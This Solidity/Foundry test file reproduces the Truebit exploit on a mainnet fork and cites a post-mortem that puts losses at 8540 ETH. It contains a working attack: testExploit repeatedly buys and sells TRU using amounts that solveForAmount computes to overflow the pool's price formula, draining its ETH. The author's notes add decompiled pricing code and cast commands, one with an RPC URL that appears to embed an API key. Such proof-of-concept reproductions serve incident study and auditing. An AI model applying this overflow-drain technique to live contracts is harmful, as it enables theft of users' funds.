// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : 8540ETH
// Attacker : https://etherscan.io/address/0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50
// Attack Contract : https://etherscan.io/address/0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8
// Vulnerable Contract : https://etherscan.io/address/0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2
// Attack Tx : https://etherscan.io/tx/0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014


// @Analysis
// Post-mortem : https://www.certik.com/zh-CN/resources/blog/truebit-incident-analysis


interface IPOOL {
    function getPurchasePrice(uint256) external view returns (uint256);
    function sellTRU(uint256) payable external;
    function buyTRU(uint256) payable external;
    function THETA() external view returns (uint256);
    function reserve() external view returns (uint256);
}

contract TruebitExpTest is BaseTestWithBalanceLog {
    IPOOL constant POOL = IPOOL(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2);
    IERC20 constant TRU = IERC20(0xf65B5C5104c4faFD4b709d9D60a185eAE063276c);
    uint256 FORK_BLOCK = 24_191_018;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testExploit() public balanceLog {
        uint256 reserve;
        uint256 parameter;
        uint256 totalSupply;

        uint256 amount;
        uint256 price;


        vm.deal(address(this), 1 ether);
        uint256 startTRUBalance = address(this).balance;
        emit log_named_uint("Starting TRU balance of attacker", startTRUBalance/1e18);
        uint256 counter = 0;
        while (address(POOL).balance >= 0.1 ether) {
            emit log_string("---- New Iteration ----");
            emit log_named_uint("Pool Ether balance", address(POOL).balance / 1e18);
            parameter = POOL.THETA();
            reserve = POOL.reserve();
            totalSupply = TRU.totalSupply();
            amount = solveForAmount(reserve, totalSupply);
            price = POOL.getPurchasePrice(amount);
            emit log_named_uint("Calculated amount to exploit", amount);
            emit log_named_uint("Calculated need Ether to buy TRU", price);
            POOL.buyTRU{value: price}(amount);
            TRU.approve(address(POOL), amount);
            POOL.sellTRU(amount);
            counter += 1;
            emit log_named_uint("Completed iterations", counter);
        }

        emit log_string("---- Exploit Finished ----");
        uint256 finalTRUBalance = address(this).balance;
        emit log_named_uint("Final ETHER balance of attacker", finalTRUBalance/1e18);
    }


    /**
     * @notice Reverse calculates the amount required to reach maximum price
     * @param reserve The pool reserve amount (R)
     * @param totalSupply The total supply of the token (T)
     * @return amount The calculated amount (A)
     */
    function solveForAmount(uint256 reserve, uint256 totalSupply) public pure returns (uint256) {
        require(reserve > 0, "Reserve cannot be zero");

        // 1. Define the target Price as the maximum value of uint256
        uint256 maxPrice = type(uint256).max;

        // 2. Calculate the constant part of the formula: K = Price / (100 * R)
        // Note: Division is performed first to prevent overflow from early multiplication
        uint256 k = maxPrice / (100 * reserve);

        // 3. Calculate the value inside the square root: Inner = K + T^2
        // Derivation: (A + T)^2 = K + T^2
        // Note: If totalSupply > ~3.4e38, T*T will overflow uint256.
        // This is extremely rare in standard token economics.
        uint256 tSquared = totalSupply * totalSupply;
        uint256 insideSqrt = k + tSquared;

        // 4. Calculate the square root: Root = sqrt(K + T^2)
        uint256 root = sqrt(insideSqrt);

        // 5. Final calculation: A = Root - T
        // If root < totalSupply, it indicates an underflow due to precision loss
        // (highly unlikely unless reserve is extremely large)
        if (root < totalSupply) {
            return 0;
        }

        // Added +1 to ensure the result is the closest value that satisfies >= target
        return root - totalSupply + 1;
    }

    /**
     * @dev Helper function: Calculates the square root of uint256 (Babylonian method)
     * Based on the standard implementation from Uniswap V2 or OpenZeppelin Math library
     */
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
        // else z = 0 (default)
    }
}




// personal analysis information 

// price = (200 × amount × reserve × totalSupply + 100 × amount² × reserve)/(100 × totalSupply² - parameters × totalSupply²) 


// first main tx: https://etherscan.io/tx/0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014
// cast call 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2 \
//   "getPurchasePrice(uint256)" 240442509453545333947284131 \
//   --rpc-url https://rpc.ankr.com/eth/c158eb51d2a4929b908cfba66cdbd035e4dbc70c0de572fc2b310a75d759d079 \
//   --block 24191018

// second main tx: https://etherscan.io/tx/0x71496352b02f974a3898c1b743e9fc2befb935e6c2a3e421134ec09b63052f4b

// 1. 
// 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2.getPurchasePrice 代理合约 进一步向内call
//    0xC186e6F0163e21be057E95aA135eDD52508D14d3.getPurchasePrice
//        0xf65B5C5104c4faFD4b709d9D60a185eAE063276c.totalSupply() token的代理合约
//          0x18ceDF1071EC25331130C82D7AF71D393Ccd4446.totalSupply()


// 2. 
// https://app.dedaub.com/ethereum/address/0xc186e6f0163e21be057e95aa135edd52508d14d3/decompiled
// function getPurchasePrice(uint256 amountInWei) public nonPayable {  find similar
//     require(msg.data.length - 4 >= 32);
//     v0 = 0x1446(amountInWei);
//     return v0;
// }

// function 0x1446(uint256 varg0) private { 
//     require(bool(stor_97_0_19.code.size));
//     v0, /* uint256 */ v1 = stor_97_0_19.totalSupply().gas(msg.gas);
//     require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
//     require(RETURNDATASIZE() >= 32);
//     v2 = 0x18ef(v1, v1);
//     v3 = 0x18ef(_setParameters, v2);
//     v4 = 0x18ef(v1, v1);
//     v5 = 0x18ef(100, v4);
//     v6 = _SafeSub(v3, v5);
//     v7 = 0x18ef(varg0, _reserve);
//     v8 = 0x18ef(v1, v7);
//     v9 = 0x18ef(200, v8);
//     v10 = 0x18ef(varg0, _reserve);
//     v11 = 0x18ef(varg0, v10);
//     v12 = 0x18ef(100, v11);
//     v13 = _SafeDiv(v6, v12 + v9);
//     return v13;
// }


//3.
// before first tx block : 24191019 
// cast call 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c \
// "totalSupply()" \
// --rpc-url https://rpc.ankr.com/eth/c158eb51d2a4929b908cfba66cdbd035e4dbc70c0de572fc2b310a75d759d079 \
//   --block 24191018
// -- 0x00000000000000000000000000000000000000000085cc94d6cd155fdbcdace3


// parameter -- 0x98 -- cast call 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2 "THETA()(uint256)" --rpc-url $rpc --block 24191170 --trace

// reserve -- 0x9a -- cast call 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2 "reserve()(uint256)" --rpc-url $rpc --block 24191170 --trace